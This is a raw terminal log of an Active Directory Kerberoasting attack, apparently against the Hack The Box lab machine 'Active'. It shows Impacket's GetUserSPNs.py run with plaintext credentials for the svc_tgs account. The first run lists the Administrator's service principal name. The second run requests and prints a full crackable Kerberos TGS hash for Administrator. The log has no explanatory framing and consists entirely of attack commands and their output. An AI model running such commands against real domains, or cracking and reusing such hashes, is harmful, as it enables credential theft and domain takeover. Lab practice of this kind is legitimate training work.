

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-host active.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-08-08 08:32:01.279756             






python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-host active.htb -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-08-08 08:32:01.279756             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0f8292efc312f12b22c4ad10d12f2291$7c13e0c25b9f8d493cf17250c3c0e9b4ffd0893bcdf8cebb6947c36a0b44cc7d6eb9e93fc1103e1fab6136df1cd3f5b8c679a88efe311bc6b710eb5fa7058b991425eb1bdaca3738ff3ceeefaee1538ea29544915e8205aacbfc993bb530f6a3b96ab86b52ae005cd4a7c011d9acf5fd693d1a81b4c089a33534f03db4ce2be74ea70767ec6901e56d0d21f5d700ab7490f08c37dda2374786e3d1294ed340132723c97d2f0e3bcfb456ea68d6d5ecf1bdb6775066bc0f4c42e51e1ded6a7e79de244bc29d2f232effe867bdc549bc164fc3df3f2d699e3bf7968f2f51a929fa00fbd2d82d9258a50d6df9a65c4666f2f5b4f95bde32e414ac7b23ec7f6d9907d7e549a5079327f90fbad4f0275f5593b64be2c45e3b064aa72439288c27da260960978623e1dd5eec7fafc30087d3874a0ad002c9fa1280057f7205fed0a988aee2f080dd7a7c7f2484acc6f28b87630a00c29690b75088f1b625f2f8ab0845224b35f18aca561ac2cd254c7dafc598e71cf6e6a70631b78e5ca8c825edd5898cd6ee3b157a83b01c0bb248e1851b6f274237c1abc9392b75c5775bf90f84c6f480047ef93ae3523a0ad79d8c54b5ceb619a0b6626f80cc9716b9e05686e33994c3d65264d8c27a8b7489118a2139e5644e313a7bca3ccdfedf219685f43d09037af03a76ae6b74fc59496084460a8eaca48ef822a33cf7d78a5c0dc89f81ceecd407ccd15f5ec4ae65cf83da7ddafa6538d10a2ac205123d3e8b33fec28aff1bc57a675c2880f9714d617173af33a78ecd20fd578f60ceee94c87054d82602f4c9f55396398c6c249daa210c1707c15ff6652cfc6239060417bd19b351d757fcc713e4f32473c692aa065ad54e7b3f1ad72b7bb09a866a389cb5a93e0d39fce91accbff6df37c83eafd3cf0bdbfb98a485f523838a699badceeaf47c87d15eeecee7db8f57ca07f5e5a9b2e9994083f32687c825777a11dcd10964bec64eb791d8543bcdbe7f2b1e9c6eb7b946c02cc874019c246dff6dea827d3b641c3391efe9e5177b1e8b1f2d4ed71ba066fe07d02e500fc4ccfb03de6433b57f93394d56a519764c0880ecdfd46a1e576d13a41fbf79dc579036f0efe1768022a1733df11c92e98aa1613e7c91da1dce83f164e1c9c5991cb9073587d667fd2b25eb8f848a42a12787bf28c06dc4887edce41894332db8765823fde0221fb3a635d5d1f0d1f8180d1691b07bb4c87fc716bbffed943bb9e96816c8797f
